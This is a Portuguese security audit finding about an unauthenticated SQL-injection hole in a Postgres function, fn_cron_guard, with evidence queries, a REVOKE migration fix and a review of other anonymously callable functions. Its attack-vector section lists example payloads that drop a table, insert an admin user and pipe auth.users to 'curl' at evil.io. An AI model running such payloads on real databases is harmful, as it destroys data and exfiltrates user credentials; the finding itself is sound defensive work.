# P17 — FUNC-NEW-001 (CRÍTICO): fn_cron_guard SQL Injection

## Resumo
A função `fn_cron_guard` executa SQL dinâmico via `EXECUTE p_sql` sem qualquer validação de input, e está acessível por `anon` e `PUBLIC`. Isso permite que qualquer usuário não autenticado execute SQL arbitrário no banco com os privilégios do owner da função.

## Evidência (coletada 2026-10-22 in-session)

### Código da função
```sql
SELECT proname, prosrc, prosecdef FROM pg_proc WHERE proname = 'fn_cron_guard';
```
Resultado:
```
proname: fn_cron_guard
prosecdef: false
prosrc:
BEGIN
  IF pg_try_advisory_xact_lock(p_key) THEN
    EXECUTE p_sql;  -- ← SQL INJECTION DIRETA
  ELSE
    RAISE NOTICE 'fn_cron_guard: job % ainda em execução, tick ignorado', p_key;
  END IF;
END;
```

### Grants
```sql
SELECT grantee FROM information_schema.routine_privileges WHERE routine_name = 'fn_cron_guard';
```
Resultado: `service_role`, `authenticated`, **`anon`**, `postgres`, **`PUBLIC`**

### Vetor de ataque
```sql
-- Qualquer cliente não autenticado pode:
SELECT fn_cron_guard(12345, 'DROP TABLE products CASCADE');
SELECT fn_cron_guard(99999, 'INSERT INTO admin_users VALUES (''hacker'', true)');
SELECT fn_cron_guard(1, 'COPY (SELECT * FROM auth.users) TO PROGRAM ''curl -d @- evil.io''');
```

## Fix — Migration 20261022100001

```sql
REVOKE EXECUTE ON FUNCTION public.fn_cron_guard(p_key bigint, p_sql text) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION public.fn_cron_guard(p_key bigint, p_sql text) FROM anon;
```

## Análise de SECURITY DEFINER anon (SEG-006)

Funções SECURITY DEFINER acessíveis por anon verificadas em 2026-10-22:

| Função | Args | Avaliação |
|---|---|---|
| `check_login_rate_limit` | email, ip | ✅ Legítimo — rate limiting no login |
| `fn_global_search` | term, limit, types | ✅ Legítimo — busca pública de catálogo |
| `fn_product_active_for_rls` | id | ✅ Legítimo — usado em políticas RLS |
| `fn_super_filtro` | múltiplos filtros | ✅ Legítimo — filtro público de catálogo |
| `fn_super_filtro_facets` | múltiplos filtros | ✅ Legítimo — facets públicos |
| `fn_super_filtro_price_range` | brands, category, etc. | ✅ Legítimo — range de preço público |
| `get_catalog_bestseller_page` | sort, limit, offset | ⚠️ ALTO — SQL dinâmico (FUNC-NEW-002) |
| `get_quote_token_public` | token | ⚠️ Revisar — acesso por token a orçamentos |
| `get_sitemap_public` | limit, offset | ✅ Legítimo — sitemap público |
| `submit_quote_response` | token, response, notes | ⚠️ Revisar — permite anon submeter resposta |

## Risco Residual Após Aplicação

- `fn_cron_guard` sem anon/PUBLIC: **ELIMINADO** — nenhum usuário não autenticado pode chamar
- `get_catalog_bestseller_page`: ainda SECURITY DEFINER + dynamic SQL, risco MÉDIO (FUNC-NEW-002 separado)
- `submit_quote_response`: requer análise funcional para decidir se anon deve poder submeter

## Como Aplicar

1. Abrir PR com `supabase/migrations/20261022100001_security_fn_cron_guard_revoke_anon.sql`
2. Usar `workflow_dispatch` em `.github/workflows/db-apply-migration.yml`
3. Executar post-check: confirmar que `anon` não aparece mais nos grants

## Impacto Operacional

**Zero:** `fn_cron_guard` é chamada internamente pelo cron scheduler (`service_role`). Nenhum frontend ou edge function chama essa função como `anon`.
